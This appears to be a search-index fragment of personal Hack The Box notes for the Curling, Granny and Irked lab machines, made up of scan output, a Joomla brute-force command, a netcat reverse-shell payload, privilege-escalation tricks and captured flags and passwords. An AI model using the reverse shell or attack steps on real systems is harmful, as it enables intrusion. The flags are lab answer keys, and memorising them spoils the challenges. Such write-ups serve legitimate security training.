results: | reverse-index: | 22/tcp: 10.10.10.150 |_ 80/tcp: 10.10.10.150 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 198.14 seconds","title":"TCP"},{"location":"ctf/hack-the-box/curling[ippsecpending]/01_Enumeration/Network/#udp","text":"","title":"UDP"},{"location":"ctf/hack-the-box/curling[ippsecpending]/01_Enumeration/OtherServices/","text":"SMB SNMP SMTP Databases Other","title":"OtherServices"},{"location":"ctf/hack-the-box/curling[ippsecpending]/01_Enumeration/OtherServices/#smb","text":"","title":"SMB"},{"location":"ctf/hack-the-box/curling[ippsecpending]/01_Enumeration/OtherServices/#snmp","text":"","title":"SNMP"},{"location":"ctf/hack-the-box/curling[ippsecpending]/01_Enumeration/OtherServices/#smtp","text":"","title":"SMTP"},{"location":"ctf/hack-the-box/curling[ippsecpending]/01_Enumeration/OtherServices/#databases","text":"","title":"Databases"},{"location":"ctf/hack-the-box/curling[ippsecpending]/01_Enumeration/OtherServices/#other","text":"","title":"Other"},{"location":"ctf/hack-the-box/curling[ippsecpending]/01_Enumeration/WebServices/","text":"Nikto DirBuster / GoBuster SSL Cert WebDav CMS _)( _ )( _ )( \\/ )/ __) / __) /__\\ ( \\( ) .-_)( )(_)( )(_)( ) ( \\__ \\( (__ /(__)\\ ) ( \\____) (_____)(_____)(_/\\/\\_)(___/ \\___)(__)(__)(_)\\_) (1337.today) --=[OWASP JoomScan +---++---==[Version : 0.0.7 +---++---==[Update Date : [2018/09/23] +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo --=[Code name : Self Challenge @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP Processing http://10.10.10.150 ... [+] FireWall Detector [++] Firewall not detected [+] Detecting Joomla Version [++] Joomla 3.8.8 [+] Core Joomla Vulnerability [++] Target Joomla core is not vulnerable [+] Checking Directory Listing [++] directory has directory listing : http://10.10.10.150/administrator/components http://10.10.10.150/administrator/modules http://10.10.10.150/administrator/templates http://10.10.10.150/images/banners [+] Checking apache info/status files [++] Readable info/status files are not found [+] admin finder [++] Admin page : http://10.10.10.150/administrator/ [+] Checking robots.txt existing [++] robots.txt is not found [+] Finding common backup files name [++] Backup files are not found [+] Finding common log files name [++] error log is not found [+] Checking sensitive config.php.x file [++] Readable config files are not found Your Report : reports/10.10.10.150/ droopescan scan joomla -u http://10.10.10.150 [+] Possible interesting urls found: Detailed version information. - http://10.10.10.150/administrator/manifests/files/joomla.xml Login page. - http://10.10.10.150/administrator/ License file. - http://10.10.10.150/LICENSE.txt Version attribute contains approx version - http://10.10.10.150/plugins/system/cache/cache.xml [+] Possible version(s): 3.8.10 3.8.11 3.8.11-rc 3.8.12 3.8.12-rc 3.8.13 3.8.7 3.8.7-rc 3.8.8 3.8.8-rc 3.8.9 3.8.9-rc [+] Scan finished (0:00:06.019226 elapsed) Wordlist cewl http://10.10.10.150/ CeWL 5.4.3 (Arkanoid) Robin Wood (robin@digi.ninja) (https://digi.ninja/) the curling Curling site you and are Print for Home Cewl Uncategorised The your first post Begin Content User best End Right Sidebar Username Password Forgot Details Written Super Category Published May Hits down know its true What object article planet get sheet can feet droplets water ice from more games Watching time There this amazing username password Body Header You here Main Menu Login Form Remember Log Footer Back Top secret txt with end Good question First let bit jargon playing surface called Sheet dimensions vary but they usually around long about wide covered tiny that become cause stones curl deviate straight path These known pebble absolutely sport watch television particularly viewers looking escape frantic faster bigger higher grind most televised basketball hockey hyped feel like drinking Red Bull doing jumping jacks makes want drink glass red wine lie shag carpet deliberate Thoughtful even move very slowly players spend lot talking strategy nods quiet words encouragement rarely there disagreements When comes team member play their turn sliding stone moves elegant wind push off slide gentle release Such poise finesse Hey website Stay tuned content win Floris Email Address RSS Atom email address account will Next item span Prev Please enter Submit verification code items leading row associated Your emailed file sent Once have received able choose new HTML Comments secret.txt Base64 Decode to get Curling2018!","title":"WebServices"},{"location":"ctf/hack-the-box/curling[ippsecpending]/01_Enumeration/WebServices/#nikto","text":"","title":"Nikto"},{"location":"ctf/hack-the-box/curling[ippsecpending]/01_Enumeration/WebServices/#dirbuster-gobuster","text":"","title":"DirBuster / GoBuster"},{"location":"ctf/hack-the-box/curling[ippsecpending]/01_Enumeration/WebServices/#ssl-cert","text":"","title":"SSL Cert"},{"location":"ctf/hack-the-box/curling[ippsecpending]/01_Enumeration/WebServices/#webdav","text":"","title":"WebDav"},{"location":"ctf/hack-the-box/curling[ippsecpending]/01_Enumeration/WebServices/#cms","text":"_)( _ )( _ )( \\/ )/ __) / __) /__\\ ( \\( ) .-_)( )(_)( )(_)( ) ( \\__ \\( (__ /(__)\\ ) ( \\____) (_____)(_____)(_/\\/\\_)(___/ \\___)(__)(__)(_)\\_) (1337.today) --=[OWASP JoomScan +---++---==[Version : 0.0.7 +---++---==[Update Date : [2018/09/23] +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo --=[Code name : Self Challenge @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP Processing http://10.10.10.150 ... [+] FireWall Detector [++] Firewall not detected [+] Detecting Joomla Version [++] Joomla 3.8.8 [+] Core Joomla Vulnerability [++] Target Joomla core is not vulnerable [+] Checking Directory Listing [++] directory has directory listing : http://10.10.10.150/administrator/components http://10.10.10.150/administrator/modules http://10.10.10.150/administrator/templates http://10.10.10.150/images/banners [+] Checking apache info/status files [++] Readable info/status files are not found [+] admin finder [++] Admin page : http://10.10.10.150/administrator/ [+] Checking robots.txt existing [++] robots.txt is not found [+] Finding common backup files name [++] Backup files are not found [+] Finding common log files name [++] error log is not found [+] Checking sensitive config.php.x file [++] Readable config files are not found Your Report : reports/10.10.10.150/ droopescan scan joomla -u http://10.10.10.150 [+] Possible interesting urls found: Detailed version information. - http://10.10.10.150/administrator/manifests/files/joomla.xml Login page. - http://10.10.10.150/administrator/ License file. - http://10.10.10.150/LICENSE.txt Version attribute contains approx version - http://10.10.10.150/plugins/system/cache/cache.xml [+] Possible version(s): 3.8.10 3.8.11 3.8.11-rc 3.8.12 3.8.12-rc 3.8.13 3.8.7 3.8.7-rc 3.8.8 3.8.8-rc 3.8.9 3.8.9-rc [+] Scan finished (0:00:06.019226 elapsed)","title":"CMS"},{"location":"ctf/hack-the-box/curling[ippsecpending]/01_Enumeration/WebServices/#wordlist","text":"cewl http://10.10.10.150/ CeWL 5.4.3 (Arkanoid) Robin Wood (robin@digi.ninja) (https://digi.ninja/) the curling Curling site you and are Print for Home Cewl Uncategorised The your first post Begin Content User best End Right Sidebar Username Password Forgot Details Written Super Category Published May Hits down know its true What object article planet get sheet can feet droplets water ice from more games Watching time There this amazing username password Body Header You here Main Menu Login Form Remember Log Footer Back Top secret txt with end Good question First let bit jargon playing surface called Sheet dimensions vary but they usually around long about wide covered tiny that become cause stones curl deviate straight path These known pebble absolutely sport watch television particularly viewers looking escape frantic faster bigger higher grind most televised basketball hockey hyped feel like drinking Red Bull doing jumping jacks makes want drink glass red wine lie shag carpet deliberate Thoughtful even move very slowly players spend lot talking strategy nods quiet words encouragement rarely there disagreements When comes team member play their turn sliding stone moves elegant wind push off slide gentle release Such poise finesse Hey website Stay tuned content win Floris Email Address RSS Atom email address account will Next item span Prev Please enter Submit verification code items leading row associated Your emailed file sent Once have received able choose new","title":"Wordlist"},{"location":"ctf/hack-the-box/curling[ippsecpending]/01_Enumeration/WebServices/#html-comments","text":"secret.txt Base64 Decode to get Curling2018!","title":"HTML Comments"},{"location":"ctf/hack-the-box/curling[ippsecpending]/02_Exploitation/01_Joomla/","text":"Joomla Password nmap -p80 --script http-joomla-brute --script-args 'userdb=wordlist,passdb=password' 10.10.10.150 Floris:Curling2018! Getting shell system( rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc 10.10.14.10 4444 /tmp/f );","title":"01 Joomla"},{"location":"ctf/hack-the-box/curling[ippsecpending]/02_Exploitation/01_Joomla/#joomla-password","text":"nmap -p80 --script http-joomla-brute --script-args 'userdb=wordlist,passdb=password' 10.10.10.150 Floris:Curling2018!","title":"Joomla Password"},{"location":"ctf/hack-the-box/curling[ippsecpending]/02_Exploitation/01_Joomla/#getting-shell","text":"system( rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc 10.10.14.10 4444 /tmp/f );","title":"Getting shell"},{"location":"ctf/hack-the-box/curling[ippsecpending]/02_Exploitation/02_Binary/","text":"Get user -rwxr-x--- 2 root floris 4096 May 22 2018 admin-area -rw-r--r-- 1 floris floris 1076 May 22 2018 password_backup -rw-r----- 1 floris floris 33 May 22 2018 user.txt password_backup 00000000: 425a 6839 3141 5926 5359 819b bb48 0000 BZh91AY SY...H.. 00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34 ....A...P)ava.:4 00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960 N...n.T.#.@%...` 00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000 ......z.@...... 00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800 ..i.4hdi...9.h.. 00000050: 000f 51a0 0064 681a 069e a190 0000 0034 ..Q..dh........4 00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0 i...5.n......J.. 00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78 .h...*..}y.. ~.x 00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931 . ...sVT.zH....1 00000090: c856 921b 1221 3385 6046 a2dd c173 0d22 .V...!3.`F...s. 000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290 ..n....7j:X.d.R. 000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503 .k./... ....)p.. 000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843 7..;.....9...P.C 000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c .Y.P...HB....*.. 000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090 .G.. .U@r..rE8P. 000000f0: 819b bb48 ...H Unzip xdd -r password_backup password_backup.bin Use file to get the file type and extract bz2 gz tar . cat password.txt 5d wdCbdZu)|hChXll SSH ssh floris@10.10.10.150","title":"02 Binary"},{"location":"ctf/hack-the-box/curling[ippsecpending]/02_Exploitation/02_Binary/#get-user","text":"-rwxr-x--- 2 root floris 4096 May 22 2018 admin-area -rw-r--r-- 1 floris floris 1076 May 22 2018 password_backup -rw-r----- 1 floris floris 33 May 22 2018 user.txt password_backup 00000000: 425a 6839 3141 5926 5359 819b bb48 0000 BZh91AY SY...H.. 00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34 ....A...P)ava.:4 00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960 N...n.T.#.@%...` 00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000 ......z.@...... 00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800 ..i.4hdi...9.h.. 00000050: 000f 51a0 0064 681a 069e a190 0000 0034 ..Q..dh........4 00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0 i...5.n......J.. 00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78 .h...*..}y.. ~.x 00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931 . ...sVT.zH....1 00000090: c856 921b 1221 3385 6046 a2dd c173 0d22 .V...!3.`F...s. 000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290 ..n....7j:X.d.R. 000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503 .k./... ....)p.. 000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843 7..;.....9...P.C 000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c .Y.P...HB....*.. 000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090 .G.. .U@r..rE8P. 000000f0: 819b bb48 ...H","title":"Get user"},{"location":"ctf/hack-the-box/curling[ippsecpending]/02_Exploitation/02_Binary/#unzip","text":"xdd -r password_backup password_backup.bin Use file to get the file type and extract bz2 gz tar . cat password.txt 5d wdCbdZu)|hChXll","title":"Unzip"},{"location":"ctf/hack-the-box/curling[ippsecpending]/02_Exploitation/02_Binary/#ssh","text":"ssh floris@10.10.10.150","title":"SSH"},{"location":"ctf/hack-the-box/curling[ippsecpending]/03_PostExploitation/Goodies/","text":"Hashes Password cat user.txt 65dd1df0713b40d88ead98cf11b8530b $ cat input url = http://127.0.0.1 $ echo url = \\ file:///root/root.txt\\ input $ cat report 82c198ab6fc5365fdc6da2ee5c26064a Proof, Flags, Other","title":"Goodies"},{"location":"ctf/hack-the-box/curling[ippsecpending]/03_PostExploitation/Goodies/#hashes","text":"","title":"Hashes"},{"location":"ctf/hack-the-box/curling[ippsecpending]/03_PostExploitation/Goodies/#password","text":"cat user.txt 65dd1df0713b40d88ead98cf11b8530b $ cat input url = http://127.0.0.1 $ echo url = \\ file:///root/root.txt\\ input $ cat report 82c198ab6fc5365fdc6da2ee5c26064a","title":"Password"},{"location":"ctf/hack-the-box/curling[ippsecpending]/03_PostExploitation/Goodies/#proof-flags-other","text":"","title":"Proof, Flags, Other"},{"location":"ctf/hack-the-box/curling[ippsecpending]/03_PostExploitation/InfoBreakdown/01_Host/","text":"","title":"01 Host"},{"location":"ctf/hack-the-box/curling[ippsecpending]/03_PostExploitation/InfoBreakdown/02_FileSystem/","text":"","title":"02 FileSystem"},{"location":"ctf/hack-the-box/curling[ippsecpending]/03_PostExploitation/InfoBreakdown/03_Processes/","text":"","title":"03 Processes"},{"location":"ctf/hack-the-box/curling[ippsecpending]/03_PostExploitation/InfoBreakdown/04_Applications/","text":"","title":"04 Applications"},{"location":"ctf/hack-the-box/curling[ippsecpending]/03_PostExploitation/InfoBreakdown/05_UsersGroups/","text":"","title":"05 UsersGroups"},{"location":"ctf/hack-the-box/curling[ippsecpending]/03_PostExploitation/InfoBreakdown/06_Network/","text":"","title":"06 Network"},{"location":"ctf/hack-the-box/curling[ippsecpending]/03_PostExploitation/InfoBreakdown/07_ScheduledJobs/","text":"","title":"07 ScheduledJobs"},{"location":"ctf/hack-the-box/curling[ippsecpending]/03_PostExploitation/ScriptResults/LinEnum/","text":"","title":"LinEnum"},{"location":"ctf/hack-the-box/granny/Log/","text":"","title":"Log"},{"location":"ctf/hack-the-box/granny/01_Enumeration/Network/","text":"TCP scan report for 10.10.10.15 Host is up (0.27s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 | http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT |_http-server-header: Microsoft-IIS/6.0 |_http-title: Under Construction | http-webdav-scan: | Server Type: Microsoft-IIS/6.0 | Server Date: Mon, 29 Apr 2019 04:22:06 GMT | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH | WebDAV type: Unkown |_ Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%) OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4 Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows XP SP2 or Windows Server 2003 SP2 (85%) No exact OS matches for host (test conditions non-ideal). Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.85 seconds UDP","title":"Network"},{"location":"ctf/hack-the-box/granny/01_Enumeration/Network/#tcp","text":"scan report for 10.10.10.15 Host is up (0.27s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 | http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT |_http-server-header: Microsoft-IIS/6.0 |_http-title: Under Construction | http-webdav-scan: | Server Type: Microsoft-IIS/6.0 | Server Date: Mon, 29 Apr 2019 04:22:06 GMT | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH | WebDAV type: Unkown |_ Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%) OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4 Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows XP SP2 or Windows Server 2003 SP2 (85%) No exact OS matches for host (test conditions non-ideal). Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.85 seconds","title":"TCP"},{"location":"ctf/hack-the-box/granny/01_Enumeration/Network/#udp","text":"","title":"UDP"},{"location":"ctf/hack-the-box/granny/01_Enumeration/OtherServices/","text":"SMB SNMP SMTP Databases Other","title":"OtherServices"},{"location":"ctf/hack-the-box/granny/01_Enumeration/OtherServices/#smb","text":"","title":"SMB"},{"location":"ctf/hack-the-box/granny/01_Enumeration/OtherServices/#snmp","text":"","title":"SNMP"},{"location":"ctf/hack-the-box/granny/01_Enumeration/OtherServices/#smtp","text":"","title":"SMTP"},{"location":"ctf/hack-the-box/granny/01_Enumeration/OtherServices/#databases","text":"","title":"Databases"},{"location":"ctf/hack-the-box/granny/01_Enumeration/OtherServices/#other","text":"","title":"Other"},{"location":"ctf/hack-the-box/granny/01_Enumeration/WebServices/","text":"Nikto DirBuster / GoBuster SSL Cert WebDav CMS","title":"WebServices"},{"location":"ctf/hack-the-box/granny/01_Enumeration/WebServices/#nikto","text":"","title":"Nikto"},{"location":"ctf/hack-the-box/granny/01_Enumeration/WebServices/#dirbuster-gobuster","text":"","title":"DirBuster / GoBuster"},{"location":"ctf/hack-the-box/granny/01_Enumeration/WebServices/#ssl-cert","text":"","title":"SSL Cert"},{"location":"ctf/hack-the-box/granny/01_Enumeration/WebServices/#webdav","text":"","title":"WebDav"},{"location":"ctf/hack-the-box/granny/01_Enumeration/WebServices/#cms","text":"","title":"CMS"},{"location":"ctf/hack-the-box/granny/03_PostExploitation/Goodies/","text":"Hashes Password cd C:\\Inetpub\\wwwroot\\ ms15-051.exe ms15-051x64.exe C:\\Documents and Settings\\Administrator\\Desktop type root.txt type root.txt aa4beed1c0584445ab463a6747bd06e9 C:\\Documents and Settings\\Lakis\\Desktop type user.txt type user.txt 700c5dc163014e22b3e408f8703f67d1 C:\\Documents and Settings\\Lakis\\D Proof, Flags, Other","title":"Goodies"},{"location":"ctf/hack-the-box/granny/03_PostExploitation/Goodies/#hashes","text":"","title":"Hashes"},{"location":"ctf/hack-the-box/granny/03_PostExploitation/Goodies/#password","text":"cd C:\\Inetpub\\wwwroot\\ ms15-051.exe ms15-051x64.exe C:\\Documents and Settings\\Administrator\\Desktop type root.txt type root.txt aa4beed1c0584445ab463a6747bd06e9 C:\\Documents and Settings\\Lakis\\Desktop type user.txt type user.txt 700c5dc163014e22b3e408f8703f67d1 C:\\Documents and Settings\\Lakis\\D","title":"Password"},{"location":"ctf/hack-the-box/granny/03_PostExploitation/Goodies/#proof-flags-other","text":"","title":"Proof, Flags, Other"},{"location":"ctf/hack-the-box/granny/03_PostExploitation/InfoBreakdown/01_Host/","text":"systeminfo Host Name: GRANNY OS Name: Microsoft(R) Windows(R) Server 2003, Standard Edition OS Version: 5.2.3790 Service Pack 2 Build 3790 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Uniprocessor Free Registered Owner: HTB Registered Organization: HTB Product ID: 69712-296-0024942-44782 Original Install Date: 4/12/2017, 5:07:40 PM System Up Time: 0 Days, 5 Hours, 38 Minutes, 45 Seconds System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: X86-based PC Processor(s): 1 Processor(s) Installed. [01]: x86 Family 6 Model 63 Stepping 2 GenuineIntel ~2300 Mhz BIOS Version: INTEL - 6040000 Windows Directory: C:\\WINDOWS System Directory: C:\\WINDOWS\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (GMT+02:00) Athens, Beirut, Istanbul, Minsk Total Physical Memory: 1,023 MB Available Physical Memory: 790 MB Page File: Max Size: 2,470 MB Page File: Available: 2,328 MB Page File: In Use: 142 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Hotfix(s): 1 Hotfix(s) Installed. [01]: Q147222 Network Card(s): N/A","title":"01 Host"},{"location":"ctf/hack-the-box/granny/03_PostExploitation/InfoBreakdown/02_FileSystem/","text":"","title":"02 FileSystem"},{"location":"ctf/hack-the-box/granny/03_PostExploitation/InfoBreakdown/03_Processes/","text":"","title":"03 Processes"},{"location":"ctf/hack-the-box/granny/03_PostExploitation/InfoBreakdown/04_Applications/","text":"","title":"04 Applications"},{"location":"ctf/hack-the-box/granny/03_PostExploitation/InfoBreakdown/05_UsersGroups/","text":"","title":"05 UsersGroups"},{"location":"ctf/hack-the-box/granny/03_PostExploitation/InfoBreakdown/06_Network/","text":"","title":"06 Network"},{"location":"ctf/hack-the-box/granny/03_PostExploitation/InfoBreakdown/07_ScheduledJobs/","text":"","title":"07 ScheduledJobs"},{"location":"ctf/hack-the-box/granny/03_PostExploitation/ScriptResults/LinEnum/","text":"","title":"LinEnum"},{"location":"ctf/hack-the-box/irked/Log/","text":"","title":"Log"},{"location":"ctf/hack-the-box/irked/01_Enumeration/Network/","text":"TCP tarting Nmap 7.70 ( https://nmap.org ) at 2019-04-28 08:24 EDT Nmap scan report for 10.10.10.117 Host is up (0.33s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA) | 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA) | 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA) |_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Site doesn't have a title (text/html). 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100024 1 38619/tcp status |_ 100024 1 45111/udp status 8067/tcp open infi-async? |_irc-info: Unable to open connection 38619/tcp open status 1 (RPC #100024) 65534/tcp open unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 186.78 seconds UDP","title":"Network"},{"location":"ctf/hack-the-box/irked/01_Enumeration/Network/#tcp","text":"tarting Nmap 7.70 ( https://nmap.org ) at 2019-04-28 08:24 EDT Nmap scan report for 10.10.10.117 Host is up (0.33s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA) | 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA) | 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA) |_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Site doesn't have a title (text/html). 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100024 1 38619/tcp status |_ 100024 1 45111/udp status 8067/tcp open infi-async? |_irc-info: Unable to open connection 38619/tcp open status 1 (RPC #100024) 65534/tcp open unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 186.78 seconds","title":"TCP"},{"location":"ctf/hack-the-box/irked/01_Enumeration/Network/#udp","text":"","title":"UDP"},{"location":"ctf/hack-the-box/irked/01_Enumeration/OtherServices/","text":"SMB SNMP SMTP Databases Other IRC 5:03 -!- Welcome to the ROXnet IRC Network root!root@10.10.14.10 15:03 -!- Your host is irked.htb, running version Unreal3.2.8.1","title":"OtherServices"},{"location":"ctf/hack-the-box/irked/01_Enumeration/OtherServices/#smb","text":"","title":"SMB"},{"location":"ctf/hack-the-box/irked/01_Enumeration/OtherServices/#snmp","text":"","title":"SNMP"},{"location":"ctf/hack-the-box/irked/01_Enumeration/OtherServices/#smtp","text":"","title":"SMTP"},{"location":"ctf/hack-the-box/irked/01_Enumeration/OtherServices/#databases","text":"","title":"Databases"},{"location":"ctf/hack-the-box/irked/01_Enumeration/OtherServices/#other","text":"","title":"Other"},{"location":"ctf/hack-the-box/irked/01_Enumeration/OtherServices/#irc","text":"5:03 -!- Welcome to the ROXnet IRC Network root!root@10.10.14.10 15:03 -!- Your host is irked.htb, running version Unreal3.2.8.1","title":"IRC"},{"location":"ctf/hack-the-box/irked/01_Enumeration/WebServices/","text":"Nikto DirBuster / GoBuster SSL Cert WebDav CMS","title":"WebServices"},{"location":"ctf/hack-the-box/irked/01_Enumeration/WebServices/#nikto","text":"","title":"Nikto"},{"location":"ctf/hack-the-box/irked/01_Enumeration/WebServices/#dirbuster-gobuster","text":"","title":"DirBuster / GoBuster"},{"location":"ctf/hack-the-box/irked/01_Enumeration/WebServices/#ssl-cert","text":"","title":"SSL Cert"},{"location":"ctf/hack-the-box/irked/01_Enumeration/WebServices/#webdav","text":"","title":"WebDav"},{"location":"ctf/hack-the-box/irked/01_Enumeration/WebServices/#cms","text":"","title":"CMS"},{"location":"ctf/hack-the-box/irked/02_Exploitation/Unreal/","text":"Unreal3 back door","title":"Unreal"},{"location":"ctf/hack-the-box/irked/03_PostExploitation/Goodies/","text":"Hashes Password ircd@irked:/home/djmardov/Documents$ cat .backup cat .backup Super elite steg backup pw UPupDOWNdownLRlrBAbaSSss root@kali:~/HTB/irked# steghide extract -p UPupDOWNdownLRlrBAbaSSss -sf irked.jpg^C root@kali:~/HTB/irked# ^C root@kali:~/HTB/irked# cat pass.txt Kab6h+m+bbp2J:HG djmardov@irked:~/Documents$ cat user.txt 4a66a78b12dc0e661a59d3f5c0267a8e printf '/bin/sh' /tmp/listusers chmod a+x /tmp/listusers /usr/bin/viewuser # cat root.txt 8d8e9e8be64654b6dccc3bff4522daf3 Proof, Flags, Other","title":"Goodies"},{"location":"ctf/hack-the-box/irked/03_PostExploitation/Goodies/#hashes","text":"","title":"Hashes"},{"location":"ctf/hack-the-box/irked/03_PostExploitation/Goodies/#password","text":"ircd@irked:/home/djmardov/Documents$ cat .backup cat .backup Super elite steg backup pw UPupDOWNdownLRlrBAbaSSss root@kali:~/HTB/irked# steghide extract -p UPupDOWNdownLRlrBAbaSSss -sf irked.jpg^C root@kali:~/HTB/irked# ^C root@kali:~/HTB/irked# cat pass.txt Kab6h+m+bbp2J:HG djmardov@irked:~/Documents$ cat user.txt 4a66a78b12dc0e661a59d3f5c0267a8e printf '/bin/sh' /tmp/listusers chmod a+x /tmp/listusers /usr/bin/viewuser # cat root.txt 8d8e9e8be64654b6dccc3bff4522daf3","title":"Password"},{"location":"ctf/hack-the-box/irked/03_PostExploitation/Goodies/#proof-flags-other","text":"","title":"Proof, Flags, Other"},{"location":"ctf/hack-the-box/irked/03_PostExploitation/InfoBreakdown/01_Host/","text":"","title":"01 Host"},{"location":"ctf/hack-the-box/irked/03_PostExploitation/InfoBreakdown/02_FileSystem/","text":"","title":"02 FileSystem"},{"location":"ctf/hack-the-box/irked/03_PostExploitation/InfoBreakdown/03_Processes/","text":"","title":"03 Processes"},{"location":"ctf/hack-the-box/irked/03_PostExploitation/InfoBreakdown/04_Applications/","text":"","title":"04 